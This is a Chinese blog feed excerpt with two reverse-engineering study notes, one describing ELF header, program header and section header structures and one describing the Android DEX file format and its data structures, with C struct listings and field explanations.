<p><img src="//nanshihui.github.io/public/elfhead.jpg" alt="ELF整体图"><br>　　通过图,我们可以直观的了解整个结构.</p>
<ul>
<li>ELF 头部(ELF Header)，用来描述整个文件的组织。节区部 分包含链接视图的大量信息:指令、数据、符号表、重定位信息等等。</li>
<li>程序头部表(Program Header Table)，如果存在的话，告诉系统如何创建进程映像。 用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。</li>
<li>节区头部表(Section Heade Table)包含了描述文件节区的信息，每个节区在表中 都有一项，每一项给出诸如节区名称、节区大小这类信息。用于链接的目标文件必须包 含节区头部表，其他目标文件可以有，也可以没有这个表。</li>
</ul>
<h4 id="ELF_u6570_u636E_u7C7B_u578B"><a href="#ELF_u6570_u636E_u7C7B_u578B" class="headerlink" title="ELF数据类型"></a>ELF数据类型</h4><table>
<thead>
<tr>
<th>名称</th>
<th style="text-align:center">大小</th>
<th style="text-align:right">对齐</th>
<th style="text-align:right">用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>Elf32_Addr</td>
<td style="text-align:center">4</td>
<td style="text-align:right">4</td>
<td style="text-align:right">无符号程序地址</td>
</tr>
<tr>
<td>Elf32_Half</td>
<td style="text-align:center">2</td>
<td style="text-align:right">2</td>
<td style="text-align:right">无符号中等大小整数</td>
</tr>
<tr>
<td>Elf32_Off</td>
<td style="text-align:center">4</td>
<td style="text-align:right">4</td>
<td style="text-align:right">无符号文件偏移</td>
</tr>
<tr>
<td>Elf32_Sword</td>
<td style="text-align:center">4</td>
<td style="text-align:right">4</td>
<td style="text-align:right">有符号大整数</td>
</tr>
<tr>
<td>Elf32_Word</td>
<td style="text-align:center">4</td>
<td style="text-align:right">4</td>
<td style="text-align:right">无符号大整数</td>
</tr>
<tr>
<td>unsigned char</td>
<td style="text-align:center">1</td>
<td style="text-align:right">1</td>
<td style="text-align:right">无符号小整数</td>
</tr>
</tbody>
</table>
<h3 id="ELF_Hearder"><a href="#ELF_Hearder" class="headerlink" title="ELF Hearder"></a>ELF Hearder</h3><p>　　我们知道了基本的数据结构,就可以开始了解整个header部分.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/* ELF Header */&#10;typedef struct elfhdr &#123;&#10;    unsigned char   e_ident[EI_NIDENT];         /* ELF Identification */&#10;    Elf32_Half  e_type;                         /* object file type */&#10;    Elf32_Half  e_machine;                      /* machine */&#10;    Elf32_Word  e_version;                      /* object file version */&#10;    Elf32_Addr  e_entry;                        /* virtual entry point */&#10;    Elf32_Off   e_phoff;                        /* program header table offset */&#10;    Elf32_Off   e_shoff;                        /* section header table offset */&#10;    Elf32_Word  e_flags;                        /* processor-specific flags */&#10;    Elf32_Half  e_ehsize;                       /* ELF header size */&#10;    Elf32_Half  e_phentsize;                    /* program header entry size */&#10;    Elf32_Half  e_phnum;                        /* number of program header entries */&#10;    Elf32_Half  e_shentsize;                    /* section header entry size */&#10;    Elf32_Half  e_shnum;                        /* number of section header entries */&#10;    Elf32_Half  e_shstrndx;                     /* section header table&#39;s &#34;section header string table&#34; entry offset */&#10;&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure></p>
<p>　　最开头是16个字节的e_ident, 其中包含用以表示ELF文件的字符，以及其他一些与机器无关的信息。开头的4个字节值固定不变，为0x7f和ELF三个字符。</p>
<ul>
<li>e_ident 数组给出了 ELF 的一些标识信息，这个数组中不同下标的含义如表所示:<br><img src="//nanshihui.github.io/public/elfident.png" alt="e_ident类型图"></li>
<li>e_type 它标识的是该文件的类型。</li>
<li>e_machine 表明运行该程序需要的体系结构。</li>
<li>e_version 表示文件的版本。</li>
<li>e_entry 程序的入口地址。</li>
<li>e_phoff 表示Program header table 在文件中的偏移量（以字节计数）。</li>
<li>e_shoff 表示Section header table 在文件中的偏移量（以字节计数）。</li>
<li>e_flags 对IA32而言，此项为0。</li>
<li>e_ehsize 表示ELF header大小（以字节计数）。</li>
<li>e_phentsize 表示Program header table中每一个条目的大小。</li>
<li>e_phnum 表示Program header table中有多少个条目。</li>
<li>e_shentsize 表示Section header table中的每一个条目的大小。</li>
<li>e_shnum 表示Section header table中有多少个条目。</li>
<li>e_shstrndx 包含节名称的字符串是第几个节（从零开始计数）</li>
</ul>
<p>　　在linux下,我们可以使用readelf指令观察<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$kali -h test.so&#10;ELF &#22836;&#65306;&#10;  Magic&#65306;  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00&#10;  &#31867;&#21035;:                             ELF32&#10;  &#25968;&#25454;:                             2 &#34917;&#30721;&#65292;&#23567;&#31471;&#24207; (little endian)&#10;  &#29256;&#26412;:                             1 (current)&#10;  OS/ABI:                           UNIX - System V&#10;  ABI &#29256;&#26412;:                         0&#10;  &#31867;&#22411;:                             DYN (&#20849;&#20139;&#30446;&#26631;&#25991;&#20214;)&#10;  &#31995;&#32479;&#26550;&#26500;:                          ARM&#10;  &#29256;&#26412;:                             0x1&#10;  &#20837;&#21475;&#28857;&#22320;&#22336;&#65306;                       0x0&#10;  &#31243;&#24207;&#22836;&#36215;&#28857;&#65306;                       52 (bytes into file)&#10;  Start of section headers:        61816 (bytes into file)&#10;  &#26631;&#24535;&#65306;                            0x5000000, Version5 EABI&#10;  &#26412;&#22836;&#30340;&#22823;&#23567;&#65306;                       52 (&#23383;&#33410;)&#10;  &#31243;&#24207;&#22836;&#22823;&#23567;&#65306;                       32 (&#23383;&#33410;)&#10;  Number of program headers:       9&#10;  &#33410;&#22836;&#22823;&#23567;&#65306;                        40 (&#23383;&#33410;)&#10;  &#33410;&#22836;&#25968;&#37327;&#65306;                        24&#10;  &#23383;&#31526;&#20018;&#34920;&#32034;&#24341;&#33410;&#22836;&#65306;                 23</span><br></pre></td></tr></table></figure></p>
<h3 id="Program_Header"><a href="#Program_Header" class="headerlink" title="Program Header"></a>Program Header</h3><p>　　可执行文件或者共享目标文件的程序头部是一个结构数组，每个结构描述了一个段 或者系统准备程序执行所必需的其它信息。目标文件的“段”包含一个或者多个“节区”， 也就是“段内容(Segment Contents)”。程序头部仅对于可执行文件和共享目标文件有意义。<br>可执行目标文件在 ELF 头部的 e_phentsize 和 e_phnum 成员中给出其自身程序头部的大小.<br>　　其数据结构如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/* Program Header */&#10;typedef struct &#123;&#10;    Elf32_Word  p_type;     /* segment type */&#10;    Elf32_Off   p_offset;   /* segment offset */&#10;    Elf32_Addr  p_vaddr;    /* virtual address of segment */&#10;    Elf32_Addr  p_paddr;    /* physical address - ignored? */&#10;    Elf32_Word  p_filesz;   /* number of bytes in file for seg. */&#10;    Elf32_Word  p_memsz;    /* number of bytes in mem. for seg. */&#10;    Elf32_Word  p_flags;    /* flags */&#10;    Elf32_Word  p_align;    /* memory alignment */&#10;&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure></p>
<p>　　其具体的内容如下：</p>
<ul>
<li>p_type 此数组元素描述的段的类型，或者如何解释此数组元素的信息。</li>
<li>p_offset 此成员给出从文件头到该段第一个字节的偏移。</li>
<li>p_vaddr 此成员给出段的第一个字节将被放到内存中的虚拟地址。</li>
<li>p_paddr 此成员仅用于与物理地址相关的系统中。因为 System V 忽略所有应用程序的物理地址信息，此字段对与可执行文件和共享目标文件而言具体内容是指定的。</li>
<li>p_filesz 此成员给出段在文件映像中所占的字节数。可以为 0。</li>
<li>p_memsz 此成员给出段在内存映像中占用的字节数。可以为 0。</li>
<li>p_flags 此成员给出与段相关的标志。</li>
<li>p_align 可加载的进程段的 p_vaddr 和 p_offset 取值必须合适，相对于对页面大小的取模而言。此成员给出段在文件中和内存中如何 对齐。数值 0 和 1 表示不需要对齐。否则 p_align 应该是个正整数，并且是 2 的幂次数，p_vaddr 和 p_offset 对 p_align 取模后应该相等。</li>
</ul>
<h3 id="Sections"><a href="#Sections" class="headerlink" title="Sections"></a>Sections</h3><p>　　节区中包含目标文件中的所有信息(除ELF头部、程序头部表格、节区头部表格)。节区满足以下条件:</p>
<ul>
<li>目标文件中的每个节区都有对应的节区头部描述它，反过来，有节区头部不意 味着有节区。</li>
<li>每个节区占用文件中一个连续字节区域(这个区域可能长度为 0)。</li>
<li>文件中的节区不能重叠，不允许一个字节存在于两个节区中的情况发生。</li>
<li>目标文件中可能包含非活动空间(INACTIVE SPACE)。这些区域不属于任何头部和节区，其内容指定<br>　　详见的节区如下所示：<br><img src="//nanshihui.github.io/public/section_normal.png" alt="常见节区图"></li>
</ul>
<h3 id="Sections_head_table"><a href="#Sections_head_table" class="headerlink" title="Sections head table"></a>Sections head table</h3><p>　　节区头部表格,每个节区头部数据结构描述如下:</p>
<pre><code>typedef struct
{
  Elf32_Word    sh_name;                /* Section name (string tbl index) */
  Elf32_Word    sh_type;                /* Section type */
  Elf32_Word    sh_flags;               /* Section flags */
  Elf32_Addr    sh_addr;                /* Section virtual addr at execution */
  Elf32_Off     sh_offset;              /* Section file offset */
  Elf32_Word    sh_size;                /* Section size in bytes */
  Elf32_Word    sh_link;                /* Link to another section */
  Elf32_Word    sh_info;                /* Additional section information */
  Elf32_Word    sh_addralign;           /* Section alignment */
  Elf32_Word    sh_entsize;             /* Entry size if section holds table */
} Elf32_Shdr;
</code></pre><p><img src="//nanshihui.github.io/public/section_head.png" alt="ELF_Sections_head图"></p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>　　通过以上的分析，最后通过一个整体的图，使得对整体的结构有一个宏观的了解。</p>
<p><img src="//nanshihui.github.io/public/elfmain.png" alt="整体结果分析图"><br>此处推荐一篇实践的ELF格式分析，便于更加直观的了解。<a href="http://www.jianshu.com/p/7a75324e98ab" target="_blank" rel="external">http://www.jianshu.com/p/7a75324e98ab</a></p>
]]></content>
      
        <categories>
            
            <category> 移动安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[dex格式分析]]></title>
      <url>https://nanshihui.github.io/2017/03/30/dex%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>最近接触Android逆向,就开始熟悉dex格式,顺便记录下数据结构,方便下次直接查询.<p></p>
<h3 id="dex_u683C_u5F0F_u5206_u6790"><a href="#dex_u683C_u5F0F_u5206_u6790" class="headerlink" title="dex格式分析"></a>dex格式分析</h3><ul>
<li><strong>dex:</strong> 什么是DEX</li>
<li><strong>dex结构:</strong> 详细的dex数据结构<a id="more"></a>
<h2 id="u5F15_u8A00"><a href="#u5F15_u8A00" class="headerlink" title="引言"></a>引言</h2>　　很久之前曾接触过Android,那时候对逆向感到畏惧,当真正的开始接触他的时候,感觉其实也就那样.需要很大的耐心去看.</li>
</ul>
<h2 id="DEX"><a href="#DEX" class="headerlink" title="DEX"></a>DEX</h2><p>　　Dex是Android平台上可执行文件的类型。包含应用程序的全部操作指令以及运行时数据。由于dalvik是一种针对嵌入式设备而特殊设计的java虚拟机，所以dex文件与标准的class文件在结构设计上有着本质的区别.当java程序编译成class后，还需要使用dx工具将所有的class文件整合到一个dex文件，目的是其中各个类能够共享数据，在一定程度上降低了冗余，同时也是文件结构更加经凑，实验表明，dex文件是传统jar文件大小的50%左右.</p>
<h2 id="DEX_u7ED3_u6784"><a href="#DEX_u7ED3_u6784" class="headerlink" title="DEX结构"></a>DEX结构</h2><p>　　下面就逐步开始描述这个dex文件,首先先上一张整体dex格式图,以便有一个宏观的了解.<br><img src="//nanshihui.github.io/public/dexmain.png" alt="dex整体图"><br>　　通过图我们可以直观的发现整个结构的分布.<br>其数据结构为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexFile  &#10;&#123;  &#10;    DexHeader           Header;  &#10;    DexStringId          StringIds[stringIdsSize];  &#10;    DexTypeId           TypeIds[typeIdsSize];  &#10;    DexProtoId           ProtoIds[protoIdsSize];  &#10;    DexFieldId            FieldIds[fieldIdsSize];  &#10;    DexMethodId       MethodIds[methodIdsSize];  &#10;    DexClassDef         ClassDefs[classDefsSize];  &#10;    DexData                Data[];  &#10;    DexLink                 LinkData;  &#10;&#125;;</span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr>
<th>名称</th>
<th style="text-align:center">格式</th>
<th style="text-align:right">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>header</td>
<td style="text-align:center">header_item</td>
<td style="text-align:right">文件头。</td>
</tr>
<tr>
<td>string_ids</td>
<td style="text-align:center">string_id_item[]</td>
<td style="text-align:right">字符串索引表，记录了各个字符所在的偏移值，使用UTF-16编码。</td>
</tr>
<tr>
<td>type_ids</td>
<td style="text-align:center">type_id_item[]</td>
<td style="text-align:right">类型数据索引，记录了各个类型的字符串索引。</td>
</tr>
<tr>
<td>proto_id</td>
<td style="text-align:center">proto_id_item[]</td>
<td style="text-align:right">函数原型数据索引，记录了方法声明的字符串，返回类型和参数列表。</td>
</tr>
<tr>
<td>field_ids</td>
<td style="text-align:center">field_id_item[]</td>
<td style="text-align:right">字段数据索引，记录了所属类，声明类型和方法名等信息。</td>
</tr>
<tr>
<td>method_ids</td>
<td style="text-align:center">method_id_item[]</td>
<td style="text-align:right">类方法索引，记录了方法所属类，声明类型以及方法名等信息。</td>
</tr>
<tr>
<td>class_defs</td>
<td style="text-align:center">class_def_item[]</td>
<td style="text-align:right">类定义数据，记录了指定类的各类信息，包括接口，超类，类数据偏移量等。</td>
</tr>
<tr>
<td>data</td>
<td style="text-align:center">type_id_item[]</td>
<td style="text-align:right">数据区，保存着各个类的数据</td>
</tr>
<tr>
<td>link_data</td>
<td style="text-align:center">ubyte[]</td>
<td style="text-align:right">静态连接数据</td>
</tr>
</tbody>
</table>
<h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><p>　　header的结构如下所示.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _DexHeader  &#10;&#123;  &#10;    u1  magic[8];                       // dex &#29256;&#26412;&#26631;&#35782;&#65292;&#34;dex.035&#34;  &#10;    u4  checksum;                       // adler32 &#26816;&#39564;  &#10;    u1  signature[kSHA1DigestLen];      // SHA-1 &#21704;&#24076;&#20540;&#65292;20&#20010;&#23383;&#33410;  &#10;    u4  fileSize;                       // &#25972;&#20010; dex &#25991;&#20214;&#22823;&#23567;  &#10;    u4  headerSize;                     // DexHeader &#32467;&#26500;&#22823;&#23567;&#65292;0x70  &#10;    u4  endianTag;                      // &#23383;&#33410;&#24207;&#26631;&#35760;&#65292;&#23567;&#31471; &#34;0x12345678&#34;&#65292;&#22823;&#31471;&#34;0x78563412&#34;  &#10;    u4  linkSize;                       // &#38142;&#25509;&#27573;&#22823;&#23567;  &#10;    u4  linkOff;                        // &#38142;&#25509;&#27573;&#20559;&#31227;  &#10;    u4  mapOff;                         // DexMapList &#30340;&#20559;&#31227;  &#10;    u4  stringIdsSize;                  // DexStringId &#30340;&#20010;&#25968;  &#10;    u4  stringIdsOff;                   // DexStringId &#30340;&#20559;&#31227;         &#23383;&#31526;&#20018;  &#10;    u4  typeIdsSize;                    // DexTypeId &#30340;&#20010;&#25968;  &#10;    u4  typedeIdsOff;                   // DexTypeId &#30340;&#20559;&#31227;            &#31867;&#22411;  &#10;    u4  protoIdsSize;                   // DexProtoId &#30340;&#20010;&#25968;  &#10;    u4  protoIdsOff;                    // DexProtoId &#30340;&#20559;&#31227;           &#22768;&#26126;  &#10;    u4  fieldIdsSize;                   // DexFieldId &#30340;&#20010;&#25968;  &#10;    u4  fieldIdsOff;                    // DexFieldId &#30340;&#20559;&#31227;           &#23383;&#27573;  &#10;    u4  methodIdsSize;                  // DexMethodId &#30340;&#20010;&#25968;  &#10;    u4  methodIdsOff;                   // DexMethodId &#30340;&#20559;&#31227;          &#26041;&#27861;  &#10;    u4  classDefsSize;                  // DexClassDef &#30340;&#20010;&#25968;  &#10;    u4  classDefsOff;                   // DexClassDef &#30340;&#20559;&#31227;          &#31867;  &#10;    u4  dataSize;                       // &#25968;&#25454;&#27573;&#30340;&#22823;&#23567;  &#10;    u4  dataOff;                        // &#25968;&#25454;&#27573;&#30340;&#20559;&#31227;  &#10;&#125;DexHeader, *PDexHeader;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>magic: 它代表dex中的文件标识，一般被称为魔数。是用来识别dex这种文件的，它可以判断当前的dex文件是否有效，可以看到它用了8个1字节的无符号数来表示.</li>
<li>checksum: 它是dex文件的校验和，通过它可以判断dex文件是否被损坏或者被篡改。它占用4个字节.</li>
<li>signature[kSHA1DigestLen]: signature字段用于检验dex文件，其实就是把整个dex文件用SHA-1签名得到的一个值。这里占用20个字节.</li>
<li>fileSize: 表示整个文件的大小，占用4个字节。</li>
<li>headerSize: 表示DexHeader头结构的大小，占用4个字节。</li>
<li>endianTag: 代表 字节序标记，用于指定dex运行环境的cpu，预设值为0x12345678</li>
<li>linkSize ,linkOff: 这两个字段，它们分别指定了链接段的大小和文件偏移，通常情况下它们都为0。linkSize为0的话表示静态链接</li>
<li>mapOff: 它指定了DexMapList的文件偏移</li>
</ul>
<h3 id="DexStringId"><a href="#DexStringId" class="headerlink" title="DexStringId"></a>DexStringId</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexStringId &#123; &#10;u4 stringDataOff;        /* string_data_item &#20559;&#31227;&#22320;&#22336;*/ &#10;&#125;; &#10;struct string_data_item &#10;&#123;&#10;    uleb128 utf16_size;&#10;    ubyte   data; &#10;&#125;</span><br></pre></td></tr></table></figure>
<p>其中 data 保存的就是字符串的值。string_ids 是比较关键的，后续的区段很多都是直接指向 string_ids 的 index</p>
<h3 id="DexTypeId"><a href="#DexTypeId" class="headerlink" title="DexTypeId"></a>DexTypeId</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexTypeId&#123;&#10;    u4 descriptorIdx;   /*&#25351;&#21521;DexStringId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="DexProtoId"><a href="#DexProtoId" class="headerlink" title="DexProtoId"></a>DexProtoId</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexProtoId&#123;&#10;    u4 shortyIdx;           /*&#25351;&#21521;DexStringId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u4 returnTypeIdx;       /*&#25351;&#21521;DexTypeId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u4 parametersOff;       /*&#25351;&#21521;DexTypeList&#30340;&#20301;&#32622;&#20559;&#31227;*/&#10;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>shorty_idx: 跟 type_ids 一样，它的值是一个 string_ids 的 index 号，最终是一个简短的字符串描述，用来说明该 method 原型。</li>
<li>return_type_idx: 它的值是一个 type_ids 的 index 号 ，表示该 method 原型的返回值类型。</li>
<li>parameters_off: 指向 method 原型的参数列表 type_list，若 method 没有参数，值为0。参数列表的格式是 type_list，下面会有描述。<h3 id="DexTypeList"><a href="#DexTypeList" class="headerlink" title="DexTypeList"></a>DexTypeList</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexTypeList&#123;&#10;    u4 size;        /*DexTypeItem&#30340;&#20010;&#25968;*/&#10;    DexTypeItem list[1];    /*DexTypeItem&#32467;&#26500;*/&#10;&#125;&#10;&#10;struct DexTypeItem&#123;&#10;    u2 typeIdx;             /*&#25351;&#21521;DexTypeId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="DexFieldId"><a href="#DexFieldId" class="headerlink" title="DexFieldId"></a>DexFieldId</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexFieldId&#123;&#10;    u2 classIdx;        /*&#31867;&#30340;&#31867;&#22411;&#65292;&#25351;&#21521;DexTypeId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u2 typeIdx;     /*&#23383;&#27573;&#31867;&#22411;&#65292;&#25351;&#21521;DexTypeId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u4 nameIdx;     /*&#23383;&#27573;&#21517;&#65292;&#25351;&#21521;DexStringId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>class_idx: 表示 field 所属的 class 类型，class_idx 的值是 type_ids 的一个 index，并且必须指向一个 class 类型。</li>
<li>type_idx: 表示本 field 的类型，它的值也是 type_ids 的一个 index 。</li>
<li>name_idx: 表示本 field 的名称，它的值是 string_ids 的一个 index 。</li>
</ul>
<h3 id="DexMethodId"><a href="#DexMethodId" class="headerlink" title="DexMethodId"></a>DexMethodId</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexMethodId&#123;&#10;    u2 classIdx;        /*&#31867;&#30340;&#31867;&#22411;&#65292;&#25351;&#21521;DexTypeId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u2 protoIdx;        /*&#22768;&#26126;&#31867;&#22411;&#65292;&#25351;&#21521;DexProtoId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u4 nameIdx;     /*&#26041;&#27861;&#21517;&#65292;&#25351;&#21521;DexStringId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>class_idx: 表示 method 所属的 class 类型，class_idx 的值是 type_ids 的一个 index，并且必须指向一个 class 类型。ushort类型也是为什么我们说一个 dex 只能有 65535 个方法的原因，多了必须分包。</li>
<li>proto_idx: 表示 method 的类型，它的值也是 type_ids 的一个 index。</li>
<li>name_idx: 表示 method 的名称，它的值是 string_ids 的一个 index。</li>
</ul>
<h3 id="DexClassDef"><a href="#DexClassDef" class="headerlink" title="DexClassDef"></a>DexClassDef</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexClassDef&#123;&#10;    u4 classIdx;        /*&#31867;&#30340;&#31867;&#22411;&#65292;&#25351;&#21521;DexTypeId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u4 accessFlags;     /*&#35775;&#38382;&#26631;&#24535;*/&#10;    u4 superclassIdx;   /*&#29238;&#31867;&#31867;&#22411;&#65292;&#25351;&#21521;DexTypeId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u4 interfacesOff;   /*&#25509;&#21475;&#65292;&#25351;&#21521;DexTypeList&#30340;&#20559;&#31227;*/&#10;    u4 sourceFileIdx;   /*&#28304;&#25991;&#20214;&#21517;&#65292;&#25351;&#21521;DexStringId&#21015;&#34920;&#30340;&#32034;&#24341;*/&#10;    u4 annotationsOff;  /*&#27880;&#35299;&#65292;&#25351;&#21521;DexAnnotationsDirectoryItem&#32467;&#26500;*/&#10;    u4 classDataOff;    /*&#25351;&#21521;DexClassData&#32467;&#26500;&#30340;&#20559;&#31227;*/&#10;    u4 staticValuesOff; /*&#25351;&#21521;DexEncodedArray&#32467;&#26500;&#30340;&#20559;&#31227;*/&#10;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>class_idx: 描述具体的 class 类型，值是 type_ids 的一个 index 。值必须是一个 class 类型，不能是数组类型或者基本类型。</li>
<li>access_flags: 描述 class 的访问类型，诸如 public , final , static 等。在 dex-format.html 里 “access_flags Definitions” 有具体的描述 。</li>
<li>superclass_idx: 描述 supperclass 的类型，值的形式跟 class_idx 一样 。</li>
<li>interfaces_off: 值为偏移地址，指向 class 的 interfaces，被指向的数据结构为 type_list 。class 若没有 interfaces 值为 0。</li>
<li>source_file_idx: 表示源代码文件的信息，值是 string_ids 的一个 index。若此项信息缺失，此项值赋值为 NO_INDEX=0xffff ffff。</li>
<li>annotions_off: 值是一个偏移地址，指向的内容是该 class 的注释，位置在 data 区，格式为 annotations_direcotry_item。若没有此项内容，值为 0 。</li>
<li>class_data_off: 值是一个偏移地址，指向的内容是该 class 的使用到的数据，位置在 data 区，格式为 class_data_item。若没有此项内容值为 0。该结构里有很多内容，详细描述该 class 的 field、method, method 里的执行代码等信息，后面会介绍 class_data_item。</li>
<li>static_value_off: 值是一个偏移地址 ，指向 data 区里的一个列表 (list)，格式为 encoded_array_item。若没有此项内容值为 0。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexTypeList&#10;&#123;&#10;    uint       size;&#10;    type_item  list [size] &#10;&#125;&#10;&#10;struct type_item&#10;&#123;&#10;    ushort type_idx   //--&#62;type_ids&#10;&#125;&#10;&#10;struct DexAnnotationsDirectoryItem&#10;&#123;&#10;    uint class_annotations_off;        //--&#62;annotation_set_item&#10;    uint fields_size;&#10;    uint annotated_methods_size;&#10;    uint annotated_parameters_size;&#10;    &#10;    field_annotation field_annotations[fields_size];&#10;    method_annotation method_annotations[annotated_methods_size];&#10;    parameter_annotation parameter_annotations[annotated_parameters_size];&#10;&#125;&#10;&#10;struct field_annotation&#10;&#123;&#10;    uint field_idx;&#10;    uint annotations_off;    //--&#62;annotation_set_item&#10;&#125;&#10;&#10;struct method_annotation&#10;&#123;&#10;    uint method_idx;&#10;    uint annotations_off;    //--&#62;annotation_set_item&#10;&#125;&#10;&#10;struct parameter_annotation&#10;&#123;&#10;    uint method_idx;&#10;    uint annotations_off;    //--&#62;annotation_set_ref_list&#10;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>class_annotations_off: 这个偏移指向了 annotation_set_item 具体的可以看 dex-format.html 上的介绍.</li>
<li>fields_size: 表示属性的个数</li>
<li>annotated_methods_size: 表示方法的个数</li>
<li>annotated_parameters_size: 表示参数的个数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10;struct DexClassData&#123;&#10;    DexClassDataHeader          header;         /*&#25351;&#23450;&#23383;&#27573;&#19982;&#26041;&#27861;&#30340;&#20010;&#25968;*/&#10;    DexField*           staticFields;       /*&#38745;&#24577;&#23383;&#27573;&#65292;DexField&#32467;&#26500;*/&#10;    DexField*           instanceFields&#65307; /*&#23454;&#20363;&#23383;&#27573;&#65292;DexField&#32467;&#26500;*/&#10;    DexMethod*          directMethods;      /*&#30452;&#25509;&#26041;&#27861;&#65292;DexMethod&#32467;&#26500;*/&#10;    DexMethod*          virtualMethods;     /*&#34394;&#26041;&#27861;&#65292;DexMethod&#32467;&#26500;*/&#10;&#125;&#10;&#10;&#10;struct DexClassDataHeader&#123;&#10;    u4 staticFieldsSize;    /*&#38745;&#24577;&#23383;&#27573;&#20010;&#25968;*/&#10;    u4 instanceFieldsSize;  /*&#23454;&#20363;&#23383;&#27573;&#20010;&#25968;*/&#10;    u4 directMethodsSize;   /*&#30452;&#25509;&#26041;&#27861;&#20010;&#25968;*/&#10;    u4 virtualMethodsSize;  /*&#34394;&#26041;&#27861;&#20010;&#25968;*/&#10;&#125;&#10;&#10;struct encoded_field&#10;&#123;&#10;    uleb128 filed_idx_diff; &#10;    uleb128 access_flags;  &#10;&#125;&#10;&#10;struct encoded_method&#10;&#123;&#10;    uleb128 method_idx_diff; &#10;    uleb128 access_flags; &#10;    uleb128 code_off;&#10;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>method_idx_diff: 前缀 methd_idx 表示它的值是 method_ids 的一个 index ，后缀 _diff 表示它是于另 外一个 method_idx 的一个差值 ，就是相对于 encodeed_method [] 数组里上一个元素的 method_idx 的差值 。 其实 encoded_filed - &gt; field_idx_diff 表示的也是相同的意思 ，只是编译出来的 Hello.dex 文件里没有使用到 class filed 所以没有仔细讲 ，详细的参考 dex_format.html 的官网文档。</li>
<li>access_flags: 访问权限，比如 public、private、static、final 等。</li>
<li>code_off: 一个指向 data 区的偏移地址，目标是本 method 的代码实现。被指向的结构是code_item，有近 10 项元素。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct code_item &#10;&#123;&#10;    ushort                         registers_size;&#10;    ushort                         ins_size;&#10;    ushort                         outs_size;&#10;    ushort                         tries_size;&#10;    uint                         debug_info_off;&#10;    uint                         insns_size;&#10;    ushort                         insns [insns_size]; &#10;    ushort                         paddding;             // optional&#10;    try_item                     tries [tyies_size]; // optional&#10;    encoded_catch_handler_list  handlers;             // optional&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>code_item 结构里描述着某个 method 的具体实现.</p>
<ul>
<li>registers_size: 本段代码使用到的寄存器数目。</li>
<li>ins_size: method 传入参数的数目 。</li>
<li>outs_size: 本段代码调用其它 method 时需要的参数个数 。</li>
<li>tries_size: try_item 结构的个数 。</li>
<li>debug_off: 偏移地址，指向本段代码的 debug 信息存放位置，是一个 debug_info_item 结构。</li>
<li>insns_size: 指令列表的大小，以 16-bit 为单位。 insns 是 instructions 的缩写 。</li>
<li>padding: 值为 0，用于对齐字节 。</li>
<li>tries 和 handlers: 用于处理 java 中的 exception，常见的语法有 try catch。</li>
</ul>
